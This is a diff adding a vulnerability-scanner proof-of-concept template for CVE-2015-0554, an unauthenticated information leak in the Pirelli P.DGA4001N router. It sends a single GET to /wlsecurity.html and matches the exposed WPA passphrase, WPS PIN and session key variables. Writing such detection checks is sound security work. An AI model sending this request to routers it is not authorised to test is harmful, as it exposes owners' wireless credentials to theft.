@@ -1,0 +1,35 @@
+[info]
+author = "ave"
+description = "通过直接访问 /wlsecurity.html 页面，检测路由器是否未对敏感页面进行访问限制。若响应中包含 wpapskkey、WscDevPin、sessionkey 等无线配置变量，则证明存在信息泄露漏洞。"
+id = "POC-AVE-2015-0003"
+name = "Pirelli P.DGA4001N 路由器 Web 接口信息泄露 PoC"
+severity = "critical"
+tags = ["ave-2015-0003"]
+vuln_id = [
+    "CVE-2015-0554",
+    "AVE-2015-0003",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/wlsecurity.html"
+protocol = "http"
+
+[[poc.requests.matchers]]
+condition = "and"
+expect = true
+part = "body"
+type = "word"
+words = [
+    "var wpapskkey",
+    "var WscDevPin",
+    "var sessionkey",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
